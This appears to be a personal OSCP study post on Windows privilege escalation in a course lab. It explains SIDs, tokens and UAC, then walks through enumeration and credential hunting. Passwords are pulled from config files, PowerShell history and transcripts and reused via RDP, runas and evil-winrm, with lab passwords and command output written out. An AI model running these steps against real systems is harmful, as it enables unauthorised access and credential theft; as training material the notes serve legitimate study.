---
title: Windows Privilege Escalation
date: 2024-03-12 03:53:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Windows Privilege Escalation tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Windows Privilege Escalation

We often gain footholds on Windows systems as an unprivileged user. 

## Enumerating Windows

While we may use some technical attack vectors to escalate privileges, it can often be enough to just review information that users and the system leave behind, like when they store passwords in a .txt or when Windows records the input of a password in PowerShell.

### Understanding Windows Privileges and Access Control Mechanisms

Windows security mechanisms of interest include SIDs, access tokens, Mandatory Integrity Control, and User Account Control.

An SID identifies entities/principals that can be authenticated by Windows, like users or groups. Local account and group SIDs are generated by the Local Security Authority (LSA). Domain users and groups have SIDs generated by a Domain Controller (DC). SIDs are created when a user or group is created and cannot be changed.  

SIDs are formmatted like S-R-X-Y:
- S: indicates the string is a SID
- R: revision, always set to 1 since the overall SID structure is still on its initial version
- X: determines the identifier authority that issues the SID. ex: "5" is the most common and specifies the NT Authority. "5" is used for local and domain users and groups.
- Y: represents the sub authorities of the identifier authority. SIDs always have one or more sub authority, and it consists of the domain identifier and the relative identifier (RID). The domain identifier is the domain SID for domain users, the local machine SID for local users, and "32" for built in principals. The RID determines principals like users or groups.

For example, a local user: S-1-5-21-1336799502-1441772794-948155058-1001

The RID in this case is 1001. The RID starts at 1000 for almost all principals, so this implies this is the second local user created on the system.

Well-known SIDs are those that have a RID under 1000, and they identify generic/built-in users and groups instead of specific users and groups. Examples of well-known SIDs:
- S-1-0-0                       Nobody        
- S-1-1-0	                      Everybody
- S-1-5-11                      Authenticated Users
- S-1-5-18                      Local System
- S-1-5-domainidentifier-500    Administrator

Windows determines whether or not to grant operations based on an access token that Windows generated for authenticated users. The token contains several pieces of information that outline the security contrext of a user. Security context refers to the set of rules or attributes that are in effect.

The security context of a token includes the SID of the suer, the SIDs of the users' groups, the user and group privileges, and additional token scope information.

When a user starts a thread or process, a token is assigned to the objects, called a primary token. Primary tokens specify which permission the process will have when interecting with other objects and is a copy of the access token of the user.

Threads can also have an impersonation token assigned, which is used to provide a different security context than the process that owns the thread. Therefore, the threat interacts with objects on behalf of the impersonation token instead of the primary token of the process.

Windows also implementes Mandatory Integrity Control, which uses integrity levels to control access to securable objects. The levels are like hierarchies of trust that Windows has in a running object.

When objects are created or processes are started, they get the intergrity level of the principal performing the action. Executable files with low integrity levels are the exception - the process's integrity will also be low. Principals with low integrity levels cannot write to an object higher on the hierarchy, EVEN if perms would normally allow them to.

Since Windows Vista, processes run on the following integrity levels:
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk

Process Explorer can show us the integrity level of processes for our current user with "$ whoami /groups" and for files, "$ icacls".

Lastly, User Account Control (UAC) is a Windows security feature protecting the OS by running most tasks and apps with standard user privileges, EVEN if the user is launching them as Administrator. The administrative user obtains two access tokens after logging on, the first being a standard user token (filtered admin token), which is used to perform all non-privileged operations, and the second token being a regular administrative token. To leverage the admin token, a UAC consent prompt has to be confirmed. 

### Situational Awareness

Always obtain the following information before continuing with attacks:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

First, check users and groups.

```console
$ nc 192.168.50.220 4444

// running as dave on a client, not a server. the hostname can tell us a lot - ex: WEB01 is a web server and MSSQL01 is a MSSQL1 server.

C:\Users\dave>whoami
whoami
clientwk220\dave

// help desk often have higher permissions...

C:\Users\dave> whoami /groups
CLIENTWK220\helpdesk
BUILTIN\Remote Desktop Users

// let's look at other users. daveAdmin note - admins often have one privileged account and one non--privileged account

C:\Users\dave> powershell
PS C:\Users\dave> Get-LocalUser
BackupAdmin
dave
daveAdmin
steve

// let's look at groups. backup solutions tend to have extensive perms... however, Backup Operators are standard groups who can backup and restore all files on a computer, even ones they don't have perms for. Don't confuse this group with non-standard backup groups.
// members of Remote Desktop Users access the system with rdp, while members of Remote Managemnet Users access with WinRM.

PS C:\Users\dave> Get-LocalGroup
adminteam                  Members of this group are admins to all workstations on the second floor
BackupUsers 
helpdesk

// look at users of adminteam. adminteam is nont in the group of Administrators...

PS C:\Users\dave> Get-LocalGroupMember adminteam
User        CLIENTWK220\daveadmin Local 

PS C:\Users\dave> Get-LocalGroupMember Administrators
User        CLIENTWK220\Administrator Local          
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\backupadmin     Local  
User        CLIENTWK220\offsec        Local
```

Now, check OS architecture.

```console
// build 22000 is the version 21H2 of Windows 11. we're running a 64-bit system, meaning we can run 64-bit binaries on this system. You cannot run 64-bit binaries on 32-bit systems. 

PS C:\Users\dave> systeminfo
Host Name:                 CLIENT220
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
...
System Type:               x64-based PC
...

// list all ntwk interfaces. this system's ip was not generated from DCHP, but was set manually. useful information include the DNS server, gateway, subnect mask, and MAC address.
PS C:\Users\dave> ipconfig /all
Windows IP Configuration

   Host Name . . . . . . . . . . . . : clientwk220
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-8A-80-16
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::cc7a:964e:1f98:babb%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.50.220(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
   DHCPv6 IAID . . . . . . . . . . . : 234901590
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3B-F7-25-00-50-56-8A-80-16
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

// get routing table to see potential attack vectors to other systems
PS C:\Users\dave> route print
route print
===========================================================================
Interface List
  6...00 50 56 8a 80 16 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   192.168.50.254   192.168.50.220    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.50.0    255.255.255.0         On-link    192.168.50.220    271
   192.168.50.220  255.255.255.255         On-link    192.168.50.220    271
   192.168.50.255  255.255.255.255         On-link    192.168.50.220    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.50.220    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.50.220    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   192.168.50.254  Default 
===========================================================================
...

// list all active ntwk connections. this system is probably running a webserver on 80 and 443. 3306 indicates a MySQL server. we see our netcat conn on port 4444, and an RDP conn from someone else on port 3389. that means there is another user on this same system, and once we elevate privileges, we can use Mimikatz to try to get that user's creds.

PS C:\Users\dave> netstat -ano
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6824
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1752
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3288
...
  TCP    192.168.50.220:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.50.220:3389    192.168.119.4:33060    ESTABLISHED     1084
  TCP    192.168.50.220:4444    192.168.119.3:51082    ESTABLISHED     2044
...

// check installed applications by querying 2 registry keys, asking for bot 32bit and 64bit apps
// we see the keepass password manager, 7-zip, and XAMPP.
// after we finish our situational awareness, look these up for public exploits and try to get the master password of the password manager to try to get privileged account creds.

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
displayname                                                       
-----------                                                       
KeePass Password Safe 2.51.1                                      
Microsoft Edge                                                    
Microsoft Edge Update                                             
Microsoft Edge WebView2 Runtime                                   
...
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913

PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
DisplayName                                                   
-----------                                                   
7-Zip 21.07 (x64)                                             
...
XAMPP
VMware Tools                                                  
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913  

// we MUST also check the 32 and 64 bits in C:\Program Files and the Downloads directory!

// now see which are currently running
// we can infer that the Apache and MySQL servers were both started through XAMPP.

PS C:\Users\dave> Get-Process
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                               
-------  ------    -----      -----     ------     --  -- -----------                                                
     49      12      528       1152       0.03   2044   0 access
...
    477      49    17328      23904              6068   0 httpd
    179      29     9608      19792              6824   0 httpd
...                                                 
    174      16   210620      29048              1752   0 mysqld
...                                                  
    825      40    75804      14404       5.91   6332   0 powershell
...                                                
    379      24     6864      30236              2272   1 xampp-control
...
```

Extra examples: 

Get the path of a running processes' binary:

```console
$ Get-Process NonStandardProcess | Select-Object Path
```

### Hidden in Plain View

When browsing a home dir of our user of public folders, we can find sensitive information, like passwords, that provide us  vector for privilege escalation. Definitely look in meeting notes, config files, or onboarding documents!

We know that KeePass and XAMPP are on the system, so we should search for password manager databases and config files for these apps.

```console
// no hits?

PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

// try XAMPP config files - found passwords.txt!

PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Directory: C:\xampp\mysql\bin

Mode                 LastWriteTime         Length Name                                               
----                 -------------         ------ ----                                               
-a----         6/16/2022   1:42 PM           5786 my.ini
...
Directory: C:\xampp

Mode                 LastWriteTime         Length Name                                              
----                 -------------         ------ ----                                                                 
-a----         3/13/2017   4:04 AM            824 passwords.txt
-a----         6/16/2022  10:22 AM            792 properties.ini     
-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
-a----         6/16/2022   1:17 PM           1200 xampp-control.ini  

// turns out they are only the unmodified default passwords of XAMPP, and below we can see we don't have permission to view the contents of C:\xampp\mysql\bin\my.ini

PS C:\Users\dave> type C:\xampp\passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)
...
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 
...

PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
At line:1 char:1
+ type C:\xampp\mysql\bin\my.ini
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
   ception
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.

// check for docs in dave' home. 

PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
    Directory: C:\Users\dave\Desktop
Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                             
-a----         6/16/2022  11:28 AM            339 asdf.txt


PS C:\Users\dave> cat Desktop\asdf.txt
cat Desktop\asdf.txt
notes from meeting:

- Contractors won't deliver the web app on time
- Login will be done via local user credentials
- I need to install XAMPP and a password manager on my machine 
- When beta app is deployed on my local pc: 
Steve (the guy with long shirt) gives us his password for testing
password is: securityIsNotAnOption++++++

// let's use steve's password. what groups is he a member of?

PS C:\Users\dave> net user steve
User name                    steve
...
Last logon                   6/16/2022 1:03:52 PM

Logon hours allowed          All

Local Group Memberships      *helpdesk             *Remote Desktop Users 
                             *Remote Management Use*Users

// while not an Admin, we can connect as Steve with RDP      

$ xfreerdp /cert-ignore /bpp:8 /smart-sizing /compression -themes -wallpaper /auto-reconnect /drive:shared,/tmp /u:steve /p:securityIsNotAnOption++++++ /h:800 /w:1400 /v:192.168.227.221

// try accessing the mysql binary as steve, since we couldn't as dave

PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
# Example MySQL config file for small systems.
...

# The following options will be passed to all MySQL clients
# backupadmin Windows password for backup job
[client]
password       = admin123admin123!
port=3306
socket="C:/xampp/mysql/mysql.sock"

// we have access, see a manually set password, and see a comment saying this is also the Windows password for backupadmin. go after backupadmin!

S C:\Users\steve> net user backupadmin
User name                    BackupAdmin
...

Local Group Memberships      *Administrators       *BackupUsers
                             *Users
Global Group memberships     *None
The command completed successfully.

// backupadmin is not a Remote Desktop User or Remote Management User. Find another way to access their system or execute commands as them.
// we have gui access, so we can use Runas to run a program as a different user. Runas can be used with local or domain accounts so long as the uer has the ability to log on to the system.
// Runas requires GUI access. However, we could use WinRM or RDP to access the system if the user is a member of the corresponding groups. Or, if the user has the "Log on as a batch job" access right, we can schedule a tast to execute a program of our choice as the user. Or, if the user has an active session, we can use PsExec from Sysinternals.

PS C:\Users\steve> runas /user:backupadmin cmd
Enter the password for backupadmin:
Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
PS C:\Users\steve> 

// new commandline window appears as backupadmin

C:\Windows\system32> whoami
clientwk220\backupadmin
```

### Information Goldmine PowerShell

There is often PowerShell logging mechanisms enabled on enterprise Windows clietns and servers, such as PowerShell Transcription and PowerShell Script Block Logging.

Transcription (over-the-shoulder-transcription) stores information in transcript files, typically in the home directories of users, central directories for all users on a machine, or in a network share collecting files from all configured machines. 

Script Blocking Logging records commands and blocks of script code of events while executing. The logging is much broader because it records the full content of code and commands as they are executed. Such an event also contains the original representation of commands or encoded code!

```console
// check powershell history of a user
PS C:\Users\dave> Get-History

// retrieve history from PSReadline

PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
Clear-History
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

// NOTE: PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.

// next, look at the transcript to find the $cred if we can

PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
type C:\Users\Public\Transcripts\transcript01.txt
**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
RunAs User: CLIENTWK220\dave
Configuration Name: 
Machine: CLIENTWK220 (Microsoft Windows NT 10.0.22000.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process ID: 10336
PSVersion: 5.1.22000.282
...
**********************
Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
PS C:\Users\dave> Stop-Transcript
**********************
Windows PowerShell transcript end
End time: 20220623081221
**********************

/l let's repeat these commands in our own bind shell

PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
whoami
clientwk220\daveadmin

// while whoami works, other commands don't... we need a PowerShell remoting session via WinRM on CLIENTWK220 as user dave admin
// let's use evil-winrm

kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin

*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\

*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/20/2022   1:14 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
d-----          7/4/2022   1:00 AM                tools
d-r---         6/23/2022   8:12 AM                Users
d-----         7/20/2022   8:07 AM                Windows
d-----         6/16/2022   1:17 PM                xampp
```

